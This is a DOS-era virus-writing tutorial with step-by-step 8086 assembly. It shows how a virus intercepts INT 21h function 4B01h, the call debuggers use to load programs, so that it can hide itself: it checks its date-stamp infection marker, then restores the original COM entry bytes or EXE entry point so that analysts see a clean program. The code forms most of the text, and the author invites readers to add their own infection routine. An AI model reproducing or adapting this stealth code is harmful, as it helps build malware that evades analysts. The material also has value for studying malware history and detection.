                         4B01h/21h Stealthing Overview

  All these years, virus programmers used the 4B00h/21h (load and execute 
  program) as a trigger for infection. Why not use another DOS executing 
  function -- 4B01h/21h (load without executing). This function is used by 
  debuggers, such as DEBUG, TD (Turbo Debugger), Softice and other debuggers 
  to load a program. Intercepting this DOS function enables the virus to hide 
  itself when a debugger is being used.
 
  Here's a step by step guide on how to do this:
 
  1.  First of all we should save the ES:BX, DS:DX in our virus code before 
      calling the routine because all registers are considered destroyed on 
      return. ES:BX points to the execution parameter of the program to be 
      executed and DS:DX points to the name of the program to be executed.
 
      ***
        mov   word ptr cs:[es_bx],bx       ;Save offset of EXEC parameter
        mov   word ptr cs:[es_bx+2],es     ;Save Segment of EXEC parameter
        mov   word ptr cs:[ds_dx],dx       ;Save offset of EXEC filename
        mov   word ptr cs:[ds_dx+2],ds     ;Save segment of EXEC filename
 
 
  2.  After saving all the vital data, call the original INT 21h.
 
      ***
        call   _i21_call                  ;Call INT 21h
 
        .
        .
        .
 
      _i21_call:
        pushf
        call   cs:[i21]        ; Contains the original seg:off of INT 21h
        ret
 
 
  3.  After executing the original INT 21h, save all registers, segments and 
      all those garbage, so that the calling debugger would not notice 
      something fishy is going on. Failing to do this would hang the debugger 
      program.
 
      ***
        call   _pusha                    ;Push all Registers !!!
        ^
        This sub-module will save all registers and segments.
 
 
  4.  After saving all registers, we have to check the program if it is 
      infected by our virus. In our demo, we used the date as our infection 
      marker. If the marker is not found (uninfected program) then jump to 
      step 7. :(
 
      Note: You can hook to the infection routine to infect the program, if it 
            is not infected. I didn't do it here in our demo because you are 
            supposed to do it yourself.... :)
 
      ***
      _debug_routine:
        lds   dx,cs:[ds_dx]           ;Use saved DS:DX filename
        xor   al,al                   ;Open file...
        call  _open_file              ;_open_file()
        jc    out_debug_routine       ;On error out_debug_routine
        mov   ax,5700h                ;Get file time/date...
        call  _i21_call               ;Call real INT 21h
        call  _close_file             ;Close file now...
        cmp   dx,24cch                ;CMP virus marker ... ?
        je    ok_disinfect            ;If virus marker found then continue.
        jmp   out_debug_routine       ;If not virus marker then go out...
 
 
  5.  If the marker is present, the next thing to do is determine the type of 
      program being infected. In our case, a program which starts with E9h 
      (JMP XXXX) is assumed to be a COM program. Otherwise, it is considered 
      an EXE :)
 
      ***
      ok_disinfect:
        les   di,cs:[es_bx]             ;Load EXEC parameters to ES:DI.
        lds   si,dword ptr es:[di+18]   ;Load CS:IP of debugged program.
        push  ds                        ;{ Load DS:SI = ES:DI
        pop   es                        ;  this is the CS:IP of the debugged
        mov   di,si                     ;  program... }
        cld                             ;Clear Direction flag AY!
        lodsb                           ;Lode byte to AL
        cmp   al,0e9h                   ;CMP it with 0E9H = "JMP displacement"
        jne   exe_file_debug            ;!= then it is an EXE program.
 
 
  6.A We are assuming that the infected program is a COM. We should return all 
      original data to the entry point of the COM program, by moving it 
      towards the program's entry point. The debugger will now be viewing the 
      original entry point of the program before the infection, effectively 
      disinfecting it. All COM entry point is always at offset 100h :)
 
      ***
      com_file_debug:
        lodsw                            ; Load "offset" to AX
        add   ax,3                       ; Add 3 to adjust with 0e9,??,??
        add   ax,di                      ; to get the delta offset
        mov   bp,ax                      ; move AX to BP
        lea   si,vir_data[bp]            ; Load the data
        mov   cx,header_end - header     ; number of bytes to move...
        rep   movsb                      ; move it now...
        jmp   out_debug_routine          ; Get out ta here will ya! hehehehe!
 
  6.B We are assuming that the infected program is an EXE. In this case, we 
      are not returning any data by moving it towards the program entry point 
      instead we will be calculating the uninfected entry point address of the 
      program before the infection. This will also effectively disinfected 
      infected EXE program, by means of returning the  program's entry point 
      to its original uninfected state. (We will be doing some MATH here... :) 
      )
 
      We are assuming that the infected program is an EXE. In this case, we 
      would not be moving any host data but we would have to calculate the 
      original entry point address of the program. Unlike COMs, EXEs entry 
      point could be located anywhere in the program. By restoring the 
      program's entry point to its original uninfected state would also 
      effectively disinfected EXE program, . (We will be doing some MATH 
      here... :) )
 
      ***
      exe_file_debug:
        mov   bp,di                     ; Put DI to BP to serve as delta
        lea   si,vir_data[bp]           ; Load SI debug program vir_data[BP]
        add   si,0eh                    ; To direct towards SS:SP data.
        cld                             ; Of coz clear direct...
        lodsw                           ; Load SS displacement to AX
        xchg  ax,cx                     ; Save it in CX
        add   si,6                      ; To direct towards CS:IP data.
        lodsw                           ; Load CS displacemet to AX
        xchg  ax,dx                     ; Save it in DX
        lodsw                           ; This is just to adjust You'll see.
        les   bx,cs:[es_bx]             ; Load ES:BX(environtment parameter)
        lodsw                           ; Load uninfected SS displacement
        sub   cx,ax                     ; Subtract it with the infected one.
        sub   word ptr es:[bx+14+2],cx  ; Update SS in the parameter
        lodsw                           ; Load uninfected SP offset
        dec   ax                        ; { Decrement it twice to adjust to
        dec   ax                        ; the stack }
        mov   word ptr es:[bx+14],ax    ; Update SP in the parameter
        lodsw                           ; Load Uninfected IP
        mov   word ptr es:[bx+18],ax    ; Update IP in the parameter
        lodsw                           ; Load uninfected CS
        sub   dx,ax                     ; Subtract it with the infected one.
        sub   word ptr es:[bx+18+2],dx  ; Update CS in the parameter
 
      out_debug_routine:                 ; Terminal end-point!!!
 
 
  7.  We should POP out all the saved registers and segments then return to 
      the program (debugger) which called the 4B01h/21h routine. (This is the 
      last thing we should do).
 
      ***
        call    _popa                     ;Pop all Register !!!
        iret                              ;Return to calling module...
